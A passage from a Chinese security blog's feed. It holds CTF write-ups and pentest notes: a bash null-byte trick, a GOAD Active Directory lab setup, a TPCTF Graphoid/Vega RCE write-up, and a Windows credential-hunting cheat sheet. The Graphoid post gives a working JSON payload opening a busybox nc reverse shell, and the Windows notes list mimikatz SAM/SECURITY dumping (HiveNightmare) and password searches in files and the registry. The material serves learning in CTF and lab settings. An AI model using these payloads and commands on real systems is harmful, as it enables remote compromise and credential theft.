- bash can’t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange 利用 readarray 可以将带有特殊字符的内容存在数组中，然后再拼接输出。这种方式可以完整获取任意文件的完整内容，即使是二进制文件。 readarray -d $'\0' zArray &lt;/etc/passwd [[ "${zArray[*]}" ]] &amp;&amp; printf '%s\0' "${zArray[@]}" 但在这道题的场景下，readarray 不太好用，如果用来读取连接中的 fd 的话，readarray 会被阻塞住，导致 zArray 无法被赋值，后面的 printf 也就读不出内容。 补充： 参考了其他大佬的 writeup： ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf writeup 作者额外设置了 LC_ALL 环境变量为 C。 LC_ALL=C LC_ALL 环境变量用于覆盖所有其他本地化设置，它通常用于确保在特定程序运行时使用特定的语言环境。C 语言环境是最简单的语言环境，其中字符是单字节的，字符集是 ASCII，排序顺序基于字节值。 加入该环境变量之后，read 就不会将多个字符解析成一个特殊字符，从而解决上面 \x00 缺失的问题，测试脚本如下： #!/bin/bash echo -en "\xf0\x00\x00\x00\x12\x00" | xxd echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line; do printf "%c" "$line" done | xxd echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line; do if [[ -z $line ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd 使用二进制文件来测试也可以完全一致，可以说具备通用性了！ 参考 HTB: Interface - 0xdf hacks stuff Arithmetic operation in shell script can be exploited - DEV Community linux - bash can’t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf]]></summary></entry><entry><title type="html">GOAD 靶场环境搭建</title><link href="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html" rel="alternate" type="text/html" title="GOAD 靶场环境搭建" /><published>2023-11-28T18:29:48+08:00</published><updated>2023-11-28T18:29:48+08:00</updated><id>/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</id><content type="html" xml:base="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"><![CDATA[<h1 id="goad-靶场搭建">GOAD 靶场搭建</h1>
<p>下面是官方的搭建教程链接：</p>
<ul>
  <li><a href="https://mayfly277.github.io/posts/GOADv2/">Game Of Active Directory v2</a></li>
</ul>

<p>vagrant 下载并启动虚拟机一般没有什么问题。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant up
</code></pre></div></div>

<p>但当我执行 ansible 的命令时</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ansible-playbook main.yml
</code></pre></div></div>
<p>所有条目都是报 No hosts matched, nothing to do 的错误。寻找了其他教程貌似都没有遇到这类的错误：</p>
<ul>
  <li><a href="https://qusec.cn/posts/G0AD/#7-%E6%8E%A8%E8%8D%90-%E5%88%9B%E5%BB%BAubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%AE%89%E8%A3%85ansible-%E5%B9%B6%E9%85%8D%E7%BD%AE%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE</a></li>
  <li><a href="https://guosec.online/posts/ad6be596.html">Windows下配置安装GOAD - InfoSec’s Blog</a></li>
</ul>

<p>几个安装教程都是几个月之前的了，在此期间 GOAD 有一些更新，暂且不看更新了哪些内容，查看官方提供的安装脚本 GOAD.sh，在其中搜索 ansible-playbook 可以找到这个脚本是如何运行这部分的内容的：</p>

<p>linux 本地启动</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>ansible

<span class="nb">export </span><span class="nv">ANSIBLE_COMMAND</span><span class="o">=</span><span class="s2">"ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory"</span>

../scripts/provisionning.sh
</code></pre></div></div>

<p>换用上述的命令就可以正常执行了。</p>

<p>如果想使用 docker 的话，可以先 build 镜像。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker build <span class="nt">-t</span> goadansible <span class="nt">--network</span> host <span class="nb">.</span>
</code></pre></div></div>

<p>然后运行，命令如下</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-ti</span> <span class="nt">--rm</span> <span class="nt">--network</span> host <span class="nt">-h</span> goadansible <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:/goad <span class="nt">-w</span> /goad/ansible goadansible /bin/bash <span class="nt">-c</span> <span class="s2">"ANSIBLE_COMMAND='ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory' ../scripts/provisionning.sh"</span>
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231128021540.png" alt="20231128021540" /></p>

<p>配置期间可能会出现各种各样的错误，这时候只能求助 issue 了，一般性的问题其他人也会碰到：</p>
<ol>
  <li><a href="https://github.com/Orange-Cyberdefense/GOAD/issues/69">Issues · Orange-Cyberdefense/GOAD</a></li>
</ol>

<p>我遇到的是 SRV02 添加 admin 用户时的一个报错，在 issue 里可以看到也有人遇到过相同问题，但没有解决。</p>
<ul>
  <li>https://github.com/Orange-Cyberdefense/GOAD/issues/62</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231128203931.png" alt="20231128203931" /></p>

<p>最后只能自行解决了，具体步骤可见该 <a href="https://github.com/Orange-Cyberdefense/GOAD/issues/62">issue</a></p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://qusec.cn/posts/G0AD/#7-%E6%8E%A8%E8%8D%90-%E5%88%9B%E5%BB%BAubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%AE%89%E8%A3%85ansible-%E5%B9%B6%E9%85%8D%E7%BD%AE%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE</a></li>
  <li><a href="https://guosec.online/posts/ad6be596.html">Windows下配置安装GOAD - InfoSec’s Blog</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="GOAD" /><category term="Active Directory" /><summary type="html"><![CDATA[GOAD 靶场搭建 下面是官方的搭建教程链接： Game Of Active Directory v2 vagrant 下载并启动虚拟机一般没有什么问题。 vagrant up 但当我执行 ansible 的命令时 ansible-playbook main.yml 所有条目都是报 No hosts matched, nothing to do 的错误。寻找了其他教程貌似都没有遇到这类的错误： 域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE Windows下配置安装GOAD - InfoSec’s Blog 几个安装教程都是几个月之前的了，在此期间 GOAD 有一些更新，暂且不看更新了哪些内容，查看官方提供的安装脚本 GOAD.sh，在其中搜索 ansible-playbook 可以找到这个脚本是如何运行这部分的内容的： linux 本地启动 cd ansible export ANSIBLE_COMMAND="ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory" ../scripts/provisionning.sh 换用上述的命令就可以正常执行了。 如果想使用 docker 的话，可以先 build 镜像。 docker build -t goadansible --network host . 然后运行，命令如下 docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible /bin/bash -c "ANSIBLE_COMMAND='ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory' ../scripts/provisionning.sh" 配置期间可能会出现各种各样的错误，这时候只能求助 issue 了，一般性的问题其他人也会碰到： Issues · Orange-Cyberdefense/GOAD 我遇到的是 SRV02 添加 admin 用户时的一个报错，在 issue 里可以看到也有人遇到过相同问题，但没有解决。 https://github.com/Orange-Cyberdefense/GOAD/issues/62 最后只能自行解决了，具体步骤可见该 issue 参考 域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE Windows下配置安装GOAD - InfoSec’s Blog]]></summary></entry><entry><title type="html">TPCTF 2023 graphoid writeup</title><link href="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html" rel="alternate" type="text/html" title="TPCTF 2023 graphoid writeup" /><published>2023-11-27T18:29:48+08:00</published><updated>2023-11-27T18:29:48+08:00</updated><id>/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup</id><content type="html" xml:base="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html"><![CDATA[<p>这个题的思路并不是很明确，给出了一个 MediaWiki 已经废弃的项目：</p>
<ul>
  <li><a href="https://m.mediawiki.org/wiki/Extension:Graph/Graphoid">Extension:Graph/Graphoid - MediaWiki</a></li>
</ul>

<p>Graphoid 用于对用户提供的输入图像定义文件进行渲染，返回图像内容。</p>

<p>由于项目较老，可以考虑使用 dependency-check 先扫一遍历史漏洞。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dependency-check <span class="nt">-s</span> <span class="nb">.</span> <span class="nt">-o</span> report <span class="nt">-f</span> HTML
</code></pre></div></div>
<p>得到报告之后可以看出历史漏洞很多，但之后结合代码审计的结果看并没有什么用。</p>

<p>项目使用 nodejs 编写，项目需要看的 js 代码并不多：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>tree  | <span class="nb">grep </span>js
├── app.js
│   ├── api-util.js
│   ├── swagger-ui.js
│   ├── util.js
│   ├── vega1.js
│   ├── vega2.js
│   └── vega.js
├── npm-shrinkwrap.json
├── package.json
│   ├── graphoid-v1.js
│   ├── graphoid-v2.js
│   ├── info.js
│   └── root.js
│   └── sqlToFiles.js
├── server.js
    │   │   ├── app.js
    │   │   └── spec.js
    │   │   └── info.js
    │       └── graph.js
    ├── index.js
        ├── assert.js
        ├── logStream.js
        └── server.js
</code></pre></div></div>

<p>主体功能及对应的文件如下：</p>
<ol>
  <li>路由功能：
    <ol>
      <li>graphoid-v1.js：v1 版本的接口</li>
      <li>graphoid-v2.js：v2 版本的接口</li>
    </ol>
  </li>
  <li>渲染功能
    <ol>
      <li>vega.js：根据输入的版本信息，决定调用 vega1.js 还是 vega2.js 进行渲染。</li>
      <li>vega1.js</li>
      <li>vega2.js</li>
    </ol>
  </li>
  <li>swagger 文档：访问 /?doc</li>
  <li>系统信息：访问 /?spec</li>
</ol>

<p>主体代码似乎没什么洞，即使 graphoid-v1 中有一个 merge 操作，也并不能造成 prototype pollution。</p>

<p>代码中似乎对 underscore 也进行了调用，underscore 有一个代码执行漏洞：<a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1081503">Arbitrary Code Injection in org.webjars.npm:underscore - CVE-2021-23358 - Snyk</a>，但应该得结合原型链污染才行。</p>

<p>考虑到主体功能还是通过 vega 进行渲染，因此可以去 vega 的仓库看看 issue。找到了几个 xss。其中有一个比较有趣：</p>
<ul>
  <li>https://github.com/vega/vega/issues/3018</li>
</ul>

<p>这个 issue 的 payload 曾在 hxp2020 hackme 这道题中用于触发 XSS。</p>

<p>由于 Graphoid 中的 vega 比较老，应该是 3.2.1 版本，可以关注 vega2 的 payload：</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231127212739.png" alt="20231127212739" /></p>

<p>这个 payload 在 https://vega.github.io/vega-editor/?mode=vega 中是可以正常触发 xss 的。</p>

<p>这个 payload 只能是 XSS 吗？Graphoid 中的 vaga 可是运行在服务端，既然该漏洞能够通过 eval 执行执行任意 JavaScript 代码，那就是 RCE 了。</p>

<p>测试这个 poc 后确实可以执行代码，稍作更改即可反弹 shell。（平台更新了一次附件，第一次的附件搭建出来的环境，png 接口也可以触发，且环境中有 curl 可以带出来。更新后的附件搭建出来的环境，png 接口总会报错，但 svg 接口可以正常触发，另外环境没有 curl 了，但是有 busybox 可以 nc 反弹 shell。</p>

<p>v2 接口发送如下的 payload。</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"data"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"values"</span><span class="p">:</span><span class="w"> </span><span class="p">[{}],</span><span class="w">
      </span><span class="nl">"transform"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"filter"</span><span class="p">,</span><span class="w"> </span><span class="nl">"test"</span><span class="p">:</span><span class="w"> </span><span class="s2">"(0//1/)-'</span><span class="se">\\\n</span><span class="s2">,console.log(process.mainModule.require(</span><span class="se">\"</span><span class="s2">child_process</span><span class="se">\"</span><span class="s2">).execSync(</span><span class="se">\"</span><span class="s2">busybox nc xxxx 9001 -e ash</span><span class="se">\"</span><span class="s2">)),console.log(222))))//'"</span><span class="p">}</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>]]></content><author><name>DumKiy</name></author><category term="CTF" /><category term="nodejs" /><category term="vega" /><summary type="html"><![CDATA[这个题的思路并不是很明确，给出了一个 MediaWiki 已经废弃的项目： Extension:Graph/Graphoid - MediaWiki Graphoid 用于对用户提供的输入图像定义文件进行渲染，返回图像内容。 由于项目较老，可以考虑使用 dependency-check 先扫一遍历史漏洞。 dependency-check -s . -o report -f HTML 得到报告之后可以看出历史漏洞很多，但之后结合代码审计的结果看并没有什么用。 项目使用 nodejs 编写，项目需要看的 js 代码并不多： └─$ tree | grep js ├── app.js │ ├── api-util.js │ ├── swagger-ui.js │ ├── util.js │ ├── vega1.js │ ├── vega2.js │ └── vega.js ├── npm-shrinkwrap.json ├── package.json │ ├── graphoid-v1.js │ ├── graphoid-v2.js │ ├── info.js │ └── root.js │ └── sqlToFiles.js ├── server.js │ │ ├── app.js │ │ └── spec.js │ │ └── info.js │ └── graph.js ├── index.js ├── assert.js ├── logStream.js └── server.js 主体功能及对应的文件如下： 路由功能： graphoid-v1.js：v1 版本的接口 graphoid-v2.js：v2 版本的接口 渲染功能 vega.js：根据输入的版本信息，决定调用 vega1.js 还是 vega2.js 进行渲染。 vega1.js vega2.js swagger 文档：访问 /?doc 系统信息：访问 /?spec 主体代码似乎没什么洞，即使 graphoid-v1 中有一个 merge 操作，也并不能造成 prototype pollution。 代码中似乎对 underscore 也进行了调用，underscore 有一个代码执行漏洞：Arbitrary Code Injection in org.webjars.npm:underscore - CVE-2021-23358 - Snyk，但应该得结合原型链污染才行。 考虑到主体功能还是通过 vega 进行渲染，因此可以去 vega 的仓库看看 issue。找到了几个 xss。其中有一个比较有趣： https://github.com/vega/vega/issues/3018 这个 issue 的 payload 曾在 hxp2020 hackme 这道题中用于触发 XSS。 由于 Graphoid 中的 vega 比较老，应该是 3.2.1 版本，可以关注 vega2 的 payload： 这个 payload 在 https://vega.github.io/vega-editor/?mode=vega 中是可以正常触发 xss 的。 这个 payload 只能是 XSS 吗？Graphoid 中的 vaga 可是运行在服务端，既然该漏洞能够通过 eval 执行执行任意 JavaScript 代码，那就是 RCE 了。 测试这个 poc 后确实可以执行代码，稍作更改即可反弹 shell。（平台更新了一次附件，第一次的附件搭建出来的环境，png 接口也可以触发，且环境中有 curl 可以带出来。更新后的附件搭建出来的环境，png 接口总会报错，但 svg 接口可以正常触发，另外环境没有 curl 了，但是有 busybox 可以 nc 反弹 shell。 v2 接口发送如下的 payload。 { "data": [ { "name": "data", "values": [{}], "transform": [ {"type": "filter", "test": "(0//1/)-'\\\n,console.log(process.mainModule.require(\"child_process\").execSync(\"busybox nc xxxx 9001 -e ash\")),console.log(222))))//'"} ] } ] }]]></summary></entry><entry><title type="html">Windows 提权（一）利用导出或查找密码提权</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83.html" rel="alternate" type="text/html" title="Windows 提权（一）利用导出或查找密码提权" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83.html"><![CDATA[<h1 id="windows-本地提权">Windows 本地提权</h1>
<h2 id="利用导出或查找密码提权">利用导出或查找密码提权</h2>
<p>主要思路在于使用 mimikatz 或者从配置文件、注册表项中排查密码。</p>

<h3 id="sam-and-system-fileswin10-及以下">SAM and SYSTEM files(win10 及以下)</h3>
<p>安全帐户管理器 (SAM)，通常是安全帐户管理器，是一个数据库文件。<br />
用户密码以哈希格式存储在注册表配置单元中，作为 LM 哈希或 NTLM 哈希。<br />
该文件位于 %SystemRoot%/system32/config/SAM 中，并安装在 HKLM/SAM 上。</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\system</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SYSTEM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\system</span><span class="w">
</span></code></pre></div></div>

<p><strong>直接使用 mimikatz 提取即可，无需使用 pwddump</strong></p>

<h3 id="hivenightmarewindows-10-and-11">HiveNightmare(Windows 10 and 11)</h3>
<p>不影响 Server。</p>

<blockquote>
  <p>CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p>
</blockquote>

<p>使用 <code class="language-plaintext highlighter-rouge">icacls</code> 命令检查漏洞是否存在</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\System32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="nx">config\SAM</span><span class="w">
</span><span class="n">config\SAM</span><span class="w"> </span><span class="nx">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">    </span><span class="err">&lt;</span><span class="o">--</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">wrong</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">regular</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">access</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">token::whoami</span><span class="w"> </span><span class="nx">/full</span><span class="w">

</span><span class="c"># List shadow copies available</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">misc::shadowcopies</span><span class="w">

</span><span class="c"># Extract account from SAM databases</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::sam</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/sam:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</span><span class="w">

</span><span class="c"># Extract secrets from SECURITY</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::secrets</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/security:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><a href="https://teamssix.com/210725-074847.html#!">【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现 - TeamsSix</a></li>
</ul>

<h3 id="搜索文件内容中的-password">搜索文件内容中的 password</h3>
<p>在 .xml, .ini, .txt .config 等文件中搜索 Password</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SI</span><span class="w"> </span><span class="nx">/M</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">results.txt</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">
</span></code></pre></div></div>

<p>在远程地址例如 SMB Shares 或 SharePoint 搜索</p>

<ul>
  <li>Search passwords in SharePoint: <a href="https://github.com/nheiniger/SnaffPoint">nheiniger/SnaffPoint</a> (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First, retrieve a token</span><span class="w">
</span><span class="c">## Method 1: using SnaffPoint binary</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">.</span><span class="n">\GetBearerToken.exe</span><span class="w"> </span><span class="nx">https://your.sharepoint.com</span><span class="p">)</span><span class="w">
</span><span class="c">## Method 2: using AADInternals</span><span class="w">
</span><span class="n">Install-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">CurrentUser</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-AADIntAccessToken</span><span class="w"> </span><span class="nt">-ClientId</span><span class="w"> </span><span class="s2">"9bc3ab49-b65d-410a-85ad-de819febfddc"</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="s2">"your.onmicrosoft.com"</span><span class="w"> </span><span class="nt">-Resource</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="p">)</span><span class="w">

</span><span class="c"># Second, search on Sharepoint</span><span class="w">
</span><span class="c">## Method 1: using search strings in ./presets dir</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w">
</span><span class="c">## Method 2: using search string in command line</span><span class="w">
</span><span class="c">### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="s2">"filename:.config"</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Search passwords in SMB Shares: <a href="https://github.com/SnaffCon/Snaffler">SnaffCon/Snaffler</a></li>
</ul>

<h3 id="搜索和-password-相关的文件名">搜索和 password 相关的文件名</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> <span class="na">/S /B </span><span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.txt <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.xml <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.ini <span class="o">==</span> <span class="o">*</span><span class="kd">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span>.config<span class="o">*</span>
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="kd">user</span>.txt
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="o">*</span>.ini
</code></pre></div></div>

<h3 id="搜索和-password-相关的注册表">搜索和 password 相关的注册表</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="c"># Windows Autologin</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span><span class="w"> 
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span><span class="w"> </span><span class="c"># SNMP parameters</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span><span class="c"># Putty clear text proxy credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\ORL\WinVNC3\Password"</span><span class="w"> </span><span class="c"># VNC credentials</span><span class="w">
